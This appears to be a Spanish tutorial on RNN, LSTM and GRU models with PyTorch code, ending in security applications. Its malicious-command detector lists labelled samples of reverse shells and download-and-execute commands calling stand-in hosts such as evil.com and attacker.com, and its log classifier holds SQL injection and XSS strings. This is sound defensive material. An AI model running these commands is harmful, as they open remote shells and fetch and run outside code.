# Modelos de Secuencia para NLP: RNN, LSTM y GRU

## 1. ¿Por qué Modelos de Secuencia?

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                  LIMITACIONES DE BOW/TF-IDF/EMBEDDINGS                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  "El perro mordió al hombre"  vs  "El hombre mordió al perro"               │
│                                                                              │
│  Con Bag of Words: MISMA representación! (ignora orden)                     │
│  Con embeddings promediados: MISMA representación!                          │
│                                                                              │
│  Pero el significado es COMPLETAMENTE diferente.                            │
│                                                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  SOLUCIÓN: Modelos que procesan SECUENCIAS                                  │
│                                                                              │
│     ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐                        │
│     │ El  │──▶│perro│──▶│mordió│──▶│ al │──▶│hombre│──▶ Output             │
│     └─────┘   └─────┘   └─────┘   └─────┘   └─────┘                        │
│        │         │         │         │         │                            │
│        └─────────┴─────────┴─────────┴─────────┘                            │
│                    INFORMACIÓN FLUYE →                                       │
│                                                                              │
│  El modelo "recuerda" lo que vio antes y usa ese contexto                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Redes Neuronales Recurrentes (RNN)

### 2.1 Arquitectura Básica

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           RNN BÁSICA                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  DESENROLLADA EN EL TIEMPO:                                                 │
│                                                                              │
│      x₁         x₂         x₃         x₄                                    │
│      │          │          │          │                                     │
│      ▼          ▼          ▼          ▼                                     │
│   ┌─────┐    ┌─────┐    ┌─────┐    ┌─────┐                                 │
│   │  h₁ │───▶│  h₂ │───▶│  h₃ │───▶│  h₄ │                                 │
│   └─────┘    └─────┘    └─────┘    └─────┘                                 │
│      │          │          │          │                                     │
│      ▼          ▼          ▼          ▼                                     │
│      y₁         y₂         y₃         y₄                                    │
│                                                                              │
│  FÓRMULAS:                                                                   │
│    hₜ = tanh(Wₓₕ · xₜ + Wₕₕ · hₜ₋₁ + bₕ)                                   │
│    yₜ = Wₕᵧ · hₜ + bᵧ                                                       │
│                                                                              │
│  El hidden state hₜ es la "memoria" que se pasa al siguiente paso           │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.2 Problema del Gradiente

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                VANISHING/EXPLODING GRADIENTS                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Durante backpropagation, los gradientes se multiplican en cada paso:       │
│                                                                              │
│  ∂L/∂h₁ = ∂L/∂h₄ · ∂h₄/∂h₃ · ∂h₃/∂h₂ · ∂h₂/∂h₁                            │
│                                                                              │
│  Si ∂hₜ/∂hₜ₋₁ < 1: Gradientes → 0 (VANISHING)                              │
│  Si ∂hₜ/∂hₜ₋₁ > 1: Gradientes → ∞ (EXPLODING)                              │
│                                                                              │
│  CONSECUENCIA:                                                               │
│  - RNN básica NO puede aprender dependencias a largo plazo                  │
│  - Después de ~10-20 pasos, olvida la información inicial                   │
│                                                                              │
│  "The cat, which had been sleeping on the warm windowsill                   │
│   all afternoon while the rain poured outside, suddenly ___"                │
│                                                                              │
│  RNN básica: Olvidó que hablamos de un gato para cuando llega al verbo     │
│                                                                              │
│  SOLUCIÓN: LSTM y GRU                                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. LSTM (Long Short-Term Memory)

### 3.1 Arquitectura

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              LSTM CELL                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│                        cₜ₋₁ ─────────────────────────────▶ cₜ               │
│                              │                       ▲                       │
│                              │    ┌───────┐          │                       │
│                              ├───▶│   ×   │──────────┤                       │
│                              │    └───────┘          │                       │
│                              │        ▲              │                       │
│                              │        │              │    ┌───────┐          │
│                              │    ┌───────┐     ┌───────┐│   ×   │          │
│                              └───▶│   +   │◀────│   ×   │└───▲───┘          │
│                                   └───────┘     └───────┘    │              │
│                                       ▲             ▲        │              │
│                                       │             │        │              │
│                                   ┌───────┐    ┌───────┐ ┌───────┐          │
│                                   │ iₜ    │    │ gₜ    │ │ fₜ    │          │
│                                   │(input)│    │(gate) │ │(forget│          │
│                                   └───────┘    └───────┘ └───────┘          │
│                                       ▲             ▲        ▲              │
│                                       │             │        │              │
│                                   ┌───────────────────────────┐             │
│      hₜ₋₁ ──────────────────────▶│      Concatenate          │             │
│      xₜ  ──────────────────────▶ │      [hₜ₋₁, xₜ]           │             │
│                                   └───────────────────────────┘             │
│                                                                              │
│  GATES:                                                                      │
│    fₜ = σ(Wf · [hₜ₋₁, xₜ] + bf)     ← Forget gate: qué olvidar             │
│    iₜ = σ(Wi · [hₜ₋₁, xₜ] + bi)     ← Input gate: qué recordar nuevo       │
│    gₜ = tanh(Wg · [hₜ₋₁, xₜ] + bg)  ← Candidato a nueva memoria            │
│    oₜ = σ(Wo · [hₜ₋₁, xₜ] + bo)     ← Output gate: qué emitir              │
│                                                                              │
│  ESTADO:                                                                     │
│    cₜ = fₜ ⊙ cₜ₋₁ + iₜ ⊙ gₜ        ← Nueva memoria de largo plazo         │
│    hₜ = oₜ ⊙ tanh(cₜ)              ← Nuevo hidden state                    │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 3.2 Intuición de los Gates

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         INTUICIÓN LSTM                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Imagina leer una novela y tomar notas:                                     │
│                                                                              │
│  FORGET GATE (fₜ):                                                          │
│    "¿Es esta información aún relevante?"                                    │
│    Ejemplo: Cambio de escena → olvidar detalles de la anterior             │
│    fₜ ≈ 0: Olvidar completamente                                           │
│    fₜ ≈ 1: Recordar todo                                                   │
│                                                                              │
│  INPUT GATE (iₜ):                                                           │
│    "¿Es esta nueva información importante para recordar?"                   │
│    Ejemplo: Introducción de un personaje clave → recordar                  │
│    iₜ ≈ 0: Ignorar                                                         │
│    iₜ ≈ 1: Memorizar                                                       │
│                                                                              │
│  CELL STATE (cₜ):                                                           │
│    "El cuaderno de notas"                                                   │
│    Mantiene información relevante a largo plazo                             │
│    Se actualiza selectivamente mediante forget e input gates               │
│                                                                              │
│  OUTPUT GATE (oₜ):                                                          │
│    "¿Qué parte de mis notas es relevante ahora?"                           │
│    Ejemplo: Pregunta sobre un personaje → buscar en notas                  │
│    Controla qué parte del estado interno se usa para la salida             │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. GRU (Gated Recurrent Unit)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              GRU CELL                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  GRU = LSTM simplificada (menos parámetros, similar rendimiento)            │
│                                                                              │
│  DIFERENCIAS:                                                                │
│    • Solo 2 gates vs 3 en LSTM                                              │
│    • No tiene cell state separado (solo hidden state)                       │
│    • Menos parámetros → más rápido de entrenar                              │
│                                                                              │
│  FÓRMULAS:                                                                   │
│    zₜ = σ(Wz · [hₜ₋₁, xₜ])        ← Update gate (combina forget + input)   │
│    rₜ = σ(Wr · [hₜ₋₁, xₜ])        ← Reset gate                             │
│    h̃ₜ = tanh(W · [rₜ ⊙ hₜ₋₁, xₜ]) ← Candidato                             │
│    hₜ = (1 - zₜ) ⊙ hₜ₋₁ + zₜ ⊙ h̃ₜ  ← Interpolación                        │
│                                                                              │
│  CUÁNDO USAR GRU vs LSTM:                                                   │
│    • GRU: Datasets pequeños, recursos limitados, secuencias cortas          │
│    • LSTM: Datasets grandes, dependencias muy largas, más expresivo        │
│    • En práctica: Diferencia mínima, probar ambos                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 5. Arquitecturas para NLP

### 5.1 Many-to-One (Clasificación)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MANY-TO-ONE: CLASIFICACIÓN DE TEXTO                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Input: Secuencia de palabras                                               │
│  Output: Una etiqueta (spam/no spam, sentimiento, etc.)                     │
│                                                                              │
│      "This"    "is"    "spam"    "email"                                    │
│        │        │        │         │                                        │
│        ▼        ▼        ▼         ▼                                        │
│     ┌─────┐  ┌─────┐  ┌─────┐  ┌─────┐                                     │
│     │LSTM │─▶│LSTM │─▶│LSTM │─▶│LSTM │                                     │
│     └─────┘  └─────┘  └─────┘  └─────┘                                     │
│                                    │                                        │
│                                    ▼                                        │
│                              ┌──────────┐                                   │
│                              │  Dense   │                                   │
│                              │ (Softmax)│                                   │
│                              └──────────┘                                   │
│                                    │                                        │
│                                    ▼                                        │
│                            [0.95, 0.05]                                     │
│                             Spam  Ham                                        │
│                                                                              │
│  Solo usamos el ÚLTIMO hidden state para la clasificación                   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.2 Many-to-Many (Etiquetado de Secuencias)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    MANY-TO-MANY: NER / POS TAGGING                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Input: Secuencia de palabras                                               │
│  Output: Una etiqueta POR palabra                                           │
│                                                                              │
│    "John"     "works"    "at"    "Google"                                   │
│       │          │        │         │                                       │
│       ▼          ▼        ▼         ▼                                       │
│    ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐                                   │
│    │LSTM │──▶│LSTM │──▶│LSTM │──▶│LSTM │                                   │
│    └─────┘   └─────┘   └─────┘   └─────┘                                   │
│       │          │        │         │                                       │
│       ▼          ▼        ▼         ▼                                       │
│   ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐                                   │
│   │Dense │  │Dense │  │Dense │  │Dense │                                   │
│   └──────┘  └──────┘  └──────┘  └──────┘                                   │
│       │          │        │         │                                       │
│       ▼          ▼        ▼         ▼                                       │
│    B-PER       O        O       B-ORG                                       │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 5.3 Bidirectional LSTM

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        BIDIRECTIONAL LSTM                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  PROBLEMA: LSTM unidireccional solo ve contexto PASADO                      │
│                                                                              │
│    "The bank by the river" vs "The bank approved the loan"                  │
│                                                                              │
│  Para entender "bank", necesitamos ver lo que viene DESPUÉS                 │
│                                                                              │
│  SOLUCIÓN: Dos LSTMs, una en cada dirección                                 │
│                                                                              │
│    "The"    "bank"    "approved"    "the"    "loan"                         │
│       │        │          │          │         │                            │
│       ▼        ▼          ▼          ▼         ▼                            │
│    ┌─────┐  ┌─────┐   ┌─────┐    ┌─────┐   ┌─────┐  Forward                │
│    │ →   │─▶│ →   │──▶│ →   │───▶│ →   │──▶│ →   │  ────────▶              │
│    └─────┘  └─────┘   └─────┘    └─────┘   └─────┘                         │
│       │        │          │          │         │                            │
│       ├────────┼──────────┼──────────┼─────────┤  Concatenar               │
│       │        │          │          │         │                            │
│    ┌─────┐  ┌─────┐   ┌─────┐    ┌─────┐   ┌─────┐  Backward               │
│    │ ←   │◀─│ ←   │◀──│ ←   │◀───│ ←   │◀──│ ←   │  ◀────────              │
│    └─────┘  └─────┘   └─────┘    └─────┘   └─────┘                         │
│       │        │          │          │         │                            │
│       ▼        ▼          ▼          ▼         ▼                            │
│   [h→;h←]  [h→;h←]    [h→;h←]    [h→;h←]   [h→;h←]                        │
│                                                                              │
│  Output: Concatenación de hidden states de ambas direcciones               │
│  Dimensión: 2 × hidden_size                                                 │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 6. Implementación en PyTorch

### 6.1 Clasificador de Texto con LSTM

```python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, Dataset
from torch.nn.utils.rnn import pad_sequence, pack_padded_sequence, pad_packed_sequence
import numpy as np
from typing import List, Tuple
from collections import Counter

class Vocabulary:
    """Vocabulario para mapear palabras a índices."""

    def __init__(self, min_freq: int = 1):
        self.min_freq = min_freq
        self.word2idx = {'<PAD>': 0, '<UNK>': 1}
        self.idx2word = {0: '<PAD>', 1: '<UNK>'}

    def build(self, texts: List[List[str]]):
        """Construye vocabulario desde textos tokenizados."""
        counter = Counter()
        for text in texts:
            counter.update(text)

        for word, freq in counter.items():
            if freq >= self.min_freq:
                idx = len(self.word2idx)
                self.word2idx[word] = idx
                self.idx2word[idx] = word

        print(f"Vocabulario: {len(self.word2idx)} palabras")

    def encode(self, tokens: List[str]) -> List[int]:
        """Convierte tokens a índices."""
        return [self.word2idx.get(t, self.word2idx['<UNK>']) for t in tokens]

    def __len__(self):
        return len(self.word2idx)


class TextDataset(Dataset):
    """Dataset para clasificación de texto."""

    def __init__(self, texts: List[List[str]], labels: List[int], vocab: Vocabulary):
        self.texts = [vocab.encode(text) for text in texts]
        self.labels = labels
        self.vocab = vocab

    def __len__(self):
        return len(self.texts)

    def __getitem__(self, idx):
        return torch.tensor(self.texts[idx]), torch.tensor(self.labels[idx])


def collate_fn(batch):
    """Función para padding de batches."""
    texts, labels = zip(*batch)
    lengths = torch.tensor([len(t) for t in texts])

    # Pad sequences
    texts_padded = pad_sequence(texts, batch_first=True, padding_value=0)

    return texts_padded, torch.stack(labels), lengths


class LSTMClassifier(nn.Module):
    """
    Clasificador de texto con LSTM.
    """

    def __init__(self,
                 vocab_size: int,
                 embedding_dim: int = 100,
                 hidden_dim: int = 128,
                 num_layers: int = 2,
                 num_classes: int = 2,
                 dropout: float = 0.3,
                 bidirectional: bool = True,
                 pretrained_embeddings: np.ndarray = None):
        super().__init__()

        self.hidden_dim = hidden_dim
        self.num_layers = num_layers
        self.bidirectional = bidirectional
        self.num_directions = 2 if bidirectional else 1

        # Embedding layer
        self.embedding = nn.Embedding(vocab_size, embedding_dim, padding_idx=0)

        if pretrained_embeddings is not None:
            self.embedding.weight.data.copy_(torch.from_numpy(pretrained_embeddings))
            self.embedding.weight.requires_grad = True  # Fine-tune

        # LSTM
        self.lstm = nn.LSTM(
            input_size=embedding_dim,
            hidden_size=hidden_dim,
            num_layers=num_layers,
            batch_first=True,
            dropout=dropout if num_layers > 1 else 0,
            bidirectional=bidirectional
        )

        # Clasificador
        lstm_output_dim = hidden_dim * self.num_directions
        self.fc = nn.Sequential(
            nn.Dropout(dropout),
            nn.Linear(lstm_output_dim, hidden_dim),
            nn.ReLU(),
            nn.Dropout(dropout),
            nn.Linear(hidden_dim, num_classes)
        )

    def forward(self, x, lengths=None):
        """
        Args:
            x: Input tensor (batch, seq_len)
            lengths: Longitudes reales de cada secuencia
        """
        batch_size = x.size(0)

        # Embedding
        embedded = self.embedding(x)  # (batch, seq_len, embed_dim)

        # Pack si tenemos longitudes (más eficiente, ignora padding)
        if lengths is not None:
            # Ordenar por longitud (requerido por pack_padded_sequence)
            lengths_sorted, sort_idx = lengths.sort(descending=True)
            embedded_sorted = embedded[sort_idx]

            packed = pack_padded_sequence(
                embedded_sorted,
                lengths_sorted.cpu(),
                batch_first=True
            )
            lstm_out, (hidden, cell) = self.lstm(packed)

            # Deshacer ordenamiento
            _, unsort_idx = sort_idx.sort()
            hidden = hidden[:, unsort_idx]
        else:
            lstm_out, (hidden, cell) = self.lstm(embedded)

        # Usar último hidden state
        if self.bidirectional:
            # Concatenar forward y backward del último layer
            hidden_forward = hidden[-2]  # (batch, hidden)
            hidden_backward = hidden[-1]  # (batch, hidden)
            hidden_concat = torch.cat([hidden_forward, hidden_backward], dim=1)
        else:
            hidden_concat = hidden[-1]

        # Clasificación
        output = self.fc(hidden_concat)  # (batch, num_classes)

        return output


# Ejemplo de uso
def train_text_classifier():
    # Datos de ejemplo
    texts = [
        ["this", "is", "spam", "message", "click", "here"],
        ["buy", "cheap", "products", "now", "limited", "offer"],
        ["urgent", "action", "required", "your", "account"],
        ["free", "money", "winner", "congratulations"],
        ["meeting", "tomorrow", "at", "office"],
        ["project", "update", "attached", "please", "review"],
        ["dinner", "tonight", "with", "family"],
        ["report", "deadline", "next", "week"],
    ]
    labels = [1, 1, 1, 1, 0, 0, 0, 0]  # 1=spam, 0=ham

    # Construir vocabulario
    vocab = Vocabulary(min_freq=1)
    vocab.build(texts)

    # Dataset
    dataset = TextDataset(texts, labels, vocab)
    dataloader = DataLoader(dataset, batch_size=2, shuffle=True, collate_fn=collate_fn)

    # Modelo
    model = LSTMClassifier(
        vocab_size=len(vocab),
        embedding_dim=50,
        hidden_dim=64,
        num_layers=1,
        num_classes=2,
        bidirectional=True
    )

    # Training
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=0.001)

    model.train()
    for epoch in range(20):
        total_loss = 0
        for batch_texts, batch_labels, lengths in dataloader:
            optimizer.zero_grad()
            outputs = model(batch_texts, lengths)
            loss = criterion(outputs, batch_labels)
            loss.backward()
            optimizer.step()
            total_loss += loss.item()

        if (epoch + 1) % 5 == 0:
            print(f"Epoch {epoch+1}, Loss: {total_loss/len(dataloader):.4f}")

    return model, vocab


# Entrenar
model, vocab = train_text_classifier()
```

### 6.2 LSTM para Generación de Texto

```python
import torch
import torch.nn as nn
import torch.optim as optim
from typing import List
import random

class TextGenerator(nn.Module):
    """
    Generador de texto con LSTM.
    Predice la siguiente palabra dada una secuencia.
    """

    def __init__(self,
                 vocab_size: int,
                 embedding_dim: int = 128,
                 hidden_dim: int = 256,
                 num_layers: int = 2,
                 dropout: float = 0.3):
        super().__init__()

        self.hidden_dim = hidden_dim
        self.num_layers = num_layers

        self.embedding = nn.Embedding(vocab_size, embedding_dim)

        self.lstm = nn.LSTM(
            embedding_dim,
            hidden_dim,
            num_layers=num_layers,
            batch_first=True,
            dropout=dropout if num_layers > 1 else 0
        )

        self.fc = nn.Linear(hidden_dim, vocab_size)

    def forward(self, x, hidden=None):
        """
        Args:
            x: Input (batch, seq_len)
            hidden: Hidden state opcional

        Returns:
            output: Logits para cada posición (batch, seq_len, vocab_size)
            hidden: Nuevo hidden state
        """
        embedded = self.embedding(x)
        lstm_out, hidden = self.lstm(embedded, hidden)
        output = self.fc(lstm_out)
        return output, hidden

    def generate(self, start_tokens: List[int], vocab,
                 max_length: int = 50,
                 temperature: float = 1.0) -> List[str]:
        """
        Genera texto dado un prompt inicial.

        Args:
            start_tokens: Tokens iniciales
            vocab: Vocabulario para decodificar
            max_length: Longitud máxima a generar
            temperature: Mayor = más aleatorio, menor = más determinístico
        """
        self.eval()
        device = next(self.parameters()).device

        tokens = start_tokens.copy()
        hidden = None

        with torch.no_grad():
            for _ in range(max_length):
                x = torch.tensor([tokens[-20:]]).to(device)  # Últimos 20 tokens
                output, hidden = self.forward(x, hidden)

                # Tomar predicción del último token
                logits = output[0, -1] / temperature
                probs = torch.softmax(logits, dim=0)

                # Muestrear
                next_token = torch.multinomial(probs, 1).item()

                tokens.append(next_token)

                # Parar si generamos token de fin (si existe)
                if next_token == vocab.word2idx.get('<EOS>', -1):
                    break

        # Decodificar
        generated = [vocab.idx2word.get(t, '<UNK>') for t in tokens]
        return generated


# Ejemplo de entrenamiento para generación
def train_generator():
    # Corpus de ejemplo (muy pequeño, solo demostrativo)
    corpus = """
    the malware infected the system
    the virus spread across the network
    ransomware encrypted all files
    the trojan installed a backdoor
    the attacker exploited the vulnerability
    """.lower().strip()

    # Tokenizar
    tokens = corpus.replace('\n', ' ').split()

    # Construir vocabulario
    vocab = Vocabulary(min_freq=1)
    vocab.build([tokens])

    # Crear secuencias de entrenamiento
    sequence_length = 5
    encoded = vocab.encode(tokens)

    X, y = [], []
    for i in range(len(encoded) - sequence_length):
        X.append(encoded[i:i+sequence_length])
        y.append(encoded[i+1:i+sequence_length+1])

    X = torch.tensor(X)
    y = torch.tensor(y)

    # Modelo
    model = TextGenerator(
        vocab_size=len(vocab),
        embedding_dim=32,
        hidden_dim=64,
        num_layers=1
    )

    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=0.01)

    # Entrenar
    model.train()
    for epoch in range(100):
        optimizer.zero_grad()
        output, _ = model(X)

        # Reshape para CrossEntropyLoss
        output = output.view(-1, len(vocab))
        target = y.view(-1)

        loss = criterion(output, target)
        loss.backward()
        optimizer.step()

        if (epoch + 1) % 20 == 0:
            print(f"Epoch {epoch+1}, Loss: {loss.item():.4f}")

    # Generar
    start = vocab.encode(['the', 'malware'])
    generated = model.generate(start, vocab, max_length=10, temperature=0.8)
    print(f"\nGenerado: {' '.join(generated)}")

    return model, vocab


# model, vocab = train_generator()
```

---

## 7. Técnicas Avanzadas

### 7.1 Attention sobre LSTM

```python
import torch
import torch.nn as nn
import torch.nn.functional as F

class AttentionLSTM(nn.Module):
    """
    LSTM con mecanismo de atención.
    En lugar de usar solo el último hidden state,
    aprende a ponderar todos los hidden states.
    """

    def __init__(self,
                 vocab_size: int,
                 embedding_dim: int = 100,
                 hidden_dim: int = 128,
                 num_classes: int = 2):
        super().__init__()

        self.embedding = nn.Embedding(vocab_size, embedding_dim, padding_idx=0)

        self.lstm = nn.LSTM(
            embedding_dim,
            hidden_dim,
            batch_first=True,
            bidirectional=True
        )

        # Attention
        self.attention = nn.Linear(hidden_dim * 2, 1)

        # Clasificador
        self.fc = nn.Linear(hidden_dim * 2, num_classes)

    def forward(self, x, mask=None):
        """
        Args:
            x: Input (batch, seq_len)
            mask: Máscara de padding (batch, seq_len), 1=válido, 0=padding
        """
        # Embedding
        embedded = self.embedding(x)  # (batch, seq_len, embed_dim)

        # LSTM
        lstm_out, _ = self.lstm(embedded)  # (batch, seq_len, hidden*2)

        # Attention scores
        attn_scores = self.attention(lstm_out).squeeze(-1)  # (batch, seq_len)

        # Aplicar máscara si existe
        if mask is not None:
            attn_scores = attn_scores.masked_fill(mask == 0, float('-inf'))

        # Softmax para obtener pesos
        attn_weights = F.softmax(attn_scores, dim=1)  # (batch, seq_len)

        # Weighted sum
        context = torch.bmm(
            attn_weights.unsqueeze(1),  # (batch, 1, seq_len)
            lstm_out                      # (batch, seq_len, hidden*2)
        ).squeeze(1)  # (batch, hidden*2)

        # Clasificación
        output = self.fc(context)

        return output, attn_weights


# Ejemplo de uso
vocab_size = 1000
model = AttentionLSTM(vocab_size, num_classes=3)

x = torch.randint(0, vocab_size, (4, 20))  # Batch de 4, longitud 20
mask = torch.ones(4, 20)
mask[0, 15:] = 0  # Primer ejemplo tiene padding desde posición 15

output, attention = model(x, mask)

print(f"Output shape: {output.shape}")  # (4, 3)
print(f"Attention shape: {attention.shape}")  # (4, 20)
print(f"Attention sum: {attention[0].sum().item():.4f}")  # Debe ser ~1.0
```

### 7.2 Stacked LSTMs

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         STACKED LSTM                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Múltiples capas LSTM apiladas para aprender representaciones               │
│  más abstractas.                                                             │
│                                                                              │
│       x₁        x₂        x₃        x₄                                      │
│        │         │         │         │                                       │
│        ▼         ▼         ▼         ▼                                       │
│     ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   Layer 1                        │
│     │LSTM │──▶│LSTM │──▶│LSTM │──▶│LSTM │   (features de bajo nivel)       │
│     └─────┘   └─────┘   └─────┘   └─────┘                                   │
│        │         │         │         │                                       │
│        ▼         ▼         ▼         ▼                                       │
│     ┌─────┐   ┌─────┐   ┌─────┐   ┌─────┐   Layer 2                        │
│     │LSTM │──▶│LSTM │──▶│LSTM │──▶│LSTM │   (features de alto nivel)       │
│     └─────┘   └─────┘   └─────┘   └─────┘                                   │
│        │         │         │         │                                       │
│        ▼         ▼         ▼         ▼                                       │
│       y₁        y₂        y₃        y₄                                      │
│                                                                              │
│  En PyTorch: nn.LSTM(..., num_layers=2)                                     │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 8. Aplicaciones en Seguridad

### 8.1 Clasificación de Logs

```python
import torch
import torch.nn as nn
from typing import List, Tuple

class LogClassifier(nn.Module):
    """
    Clasificador de logs de seguridad usando LSTM.

    Clasifica logs en categorías:
    - Normal
    - Brute Force
    - SQL Injection
    - XSS
    - etc.
    """

    def __init__(self,
                 vocab_size: int,
                 embedding_dim: int = 64,
                 hidden_dim: int = 128,
                 num_classes: int = 5):
        super().__init__()

        self.embedding = nn.Embedding(vocab_size, embedding_dim, padding_idx=0)

        self.lstm = nn.LSTM(
            embedding_dim,
            hidden_dim,
            num_layers=2,
            batch_first=True,
            bidirectional=True,
            dropout=0.3
        )

        self.fc = nn.Sequential(
            nn.Linear(hidden_dim * 2, hidden_dim),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(hidden_dim, num_classes)
        )

    def forward(self, x):
        embedded = self.embedding(x)
        lstm_out, (hidden, _) = self.lstm(embedded)

        # Concatenar forward y backward del último layer
        hidden_cat = torch.cat([hidden[-2], hidden[-1]], dim=1)

        output = self.fc(hidden_cat)
        return output


def preprocess_log(log: str, vocab) -> List[int]:
    """
    Preprocesa un log para el modelo.
    """
    import re

    # Normalizar elementos comunes
    log = log.lower()
    log = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'IP_ADDR', log)
    log = re.sub(r'\d{4}-\d{2}-\d{2}', 'DATE', log)
    log = re.sub(r'\d{2}:\d{2}:\d{2}', 'TIME', log)
    log = re.sub(r'user=\w+', 'USER_VAR', log)

    # Tokenizar
    tokens = re.findall(r'[a-zA-Z_]+', log)

    # Codificar
    return vocab.encode(tokens)


# Ejemplo de logs de seguridad
sample_logs = [
    "Failed password for root from 192.168.1.100 port 22 ssh2",
    "Failed password for admin from 10.0.0.50 port 22 ssh2",
    "SELECT * FROM users WHERE id='1' OR '1'='1'",
    "GET /search?q=<script>alert(1)</script> HTTP/1.1",
    "Accepted publickey for user1 from 10.0.0.1 port 22 ssh2",
]

labels = [1, 1, 2, 3, 0]  # 0=Normal, 1=BruteForce, 2=SQLi, 3=XSS

print("Logs de ejemplo con sus etiquetas:")
label_names = ['Normal', 'BruteForce', 'SQLi', 'XSS']
for log, label in zip(sample_logs, labels):
    print(f"  [{label_names[label]}] {log[:50]}...")
```

### 8.2 Detección de Comandos Maliciosos

```python
class MaliciousCommandDetector(nn.Module):
    """
    Detecta comandos shell maliciosos usando LSTM a nivel de caracteres.

    Nivel de caracteres es mejor para:
    - Ofuscación: b'a's'h' en lugar de bash
    - Encoding: \x62\x61\x73\x68
    - Variaciones de sintaxis
    """

    def __init__(self,
                 vocab_size: int = 256,  # ASCII
                 embedding_dim: int = 32,
                 hidden_dim: int = 64,
                 num_classes: int = 2):
        super().__init__()

        self.embedding = nn.Embedding(vocab_size, embedding_dim)

        self.lstm = nn.LSTM(
            embedding_dim,
            hidden_dim,
            num_layers=2,
            batch_first=True,
            bidirectional=True,
            dropout=0.2
        )

        self.fc = nn.Sequential(
            nn.Linear(hidden_dim * 2, hidden_dim),
            nn.ReLU(),
            nn.Dropout(0.3),
            nn.Linear(hidden_dim, num_classes)
        )

    def forward(self, x):
        embedded = self.embedding(x)
        lstm_out, (hidden, _) = self.lstm(embedded)
        hidden_cat = torch.cat([hidden[-2], hidden[-1]], dim=1)
        return self.fc(hidden_cat)


def encode_command(cmd: str) -> torch.Tensor:
    """Codifica comando a nivel de caracteres."""
    # Convertir a bytes y luego a tensor
    encoded = [ord(c) if ord(c) < 256 else 0 for c in cmd]
    return torch.tensor(encoded).unsqueeze(0)


# Ejemplos de comandos
commands = [
    # Maliciosos
    "curl http://evil.com/shell.sh | bash",
    "nc -e /bin/bash attacker.com 4444",
    "python -c 'import socket,subprocess,os;...'",
    "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "wget http://malware.com/backdoor -O /tmp/x && chmod +x /tmp/x && /tmp/x",

    # Benignos
    "ls -la /home/user",
    "grep -r 'error' /var/log",
    "cat /etc/passwd",  # Puede ser sospechoso en contexto
    "docker ps -a",
    "systemctl status nginx",
]

labels = [1, 1, 1, 1, 1, 0, 0, 0, 0, 0]

print("Ejemplos de comandos:")
for cmd, label in zip(commands, labels):
    status = "MALICIOSO" if label == 1 else "BENIGNO"
    print(f"  [{status}] {cmd[:50]}...")
```

---

## 9. Resumen

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 MODELOS DE SECUENCIA NLP - RESUMEN                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  RNN BÁSICA:                                                                 │
│    • Procesa secuencias token por token                                     │
│    • Problema: Vanishing gradients → no aprende dependencias largas        │
│                                                                              │
│  LSTM:                                                                       │
│    • Soluciona vanishing gradients con cell state y gates                   │
│    • Forget gate: qué olvidar                                               │
│    • Input gate: qué recordar                                               │
│    • Output gate: qué emitir                                                │
│    • Puede aprender dependencias de cientos de pasos                        │
│                                                                              │
│  GRU:                                                                        │
│    • LSTM simplificada (2 gates vs 3)                                       │
│    • Menos parámetros, similar rendimiento                                  │
│    • Preferir para datasets pequeños                                        │
│                                                                              │
│  ARQUITECTURAS:                                                              │
│    • Many-to-One: Clasificación (spam, sentiment)                           │
│    • Many-to-Many: Tagging (NER, POS)                                       │
│    • Bidirectional: Contexto pasado Y futuro                                │
│    • Stacked: Múltiples capas para features abstractas                      │
│    • Attention: Ponderar importancia de cada paso                           │
│                                                                              │
│  EN PRÁCTICA:                                                                │
│    • LSTM/GRU siguen siendo útiles para secuencias                          │
│    • Para texto: Transformers (BERT) suelen ser mejores                     │
│    • Para streaming/tiempo real: LSTM puede ser más eficiente              │
│                                                                              │
│  SEGURIDAD:                                                                  │
│    • Clasificación de logs                                                   │
│    • Detección de comandos maliciosos                                       │
